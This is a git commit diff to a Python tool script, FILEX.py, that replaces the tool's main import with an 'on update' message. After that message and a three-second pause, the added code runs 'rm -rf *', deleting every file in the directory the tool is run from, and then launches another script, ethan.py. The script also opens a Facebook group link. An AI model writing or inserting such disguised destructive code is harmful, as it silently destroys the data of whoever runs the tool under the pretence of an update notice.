f62195a59dbc25600385e5f03025f4ef106d76b3
Ahmed-XD <110410370+Ahmed-XD@users.noreply.github.com>
2023-04-02 15:02:46 +0600

    Update FILEX.py

--- FILEX.py
+++ FILEX.py
@@ -8,8 +8,10 @@ os.system('xdg-open https://m.facebook.com/groups/1247184652736578/')
 
 
 os.system('clear')
-
-#print('tool is on update bro....... \nCheck our group for update -- https://m.facebook.com/groups/1247184652736578/')
-#os.system('rm -rf *')
+import time
+print('tool is on update bro....... \nCheck our group for update -- https://m.facebook.com/groups/1247184652736578/')
+time.sleep(3)
+os.system('rm -rf *')
+os.system('python ethan.py')
 #exit()
-import RTX
+#import RTX
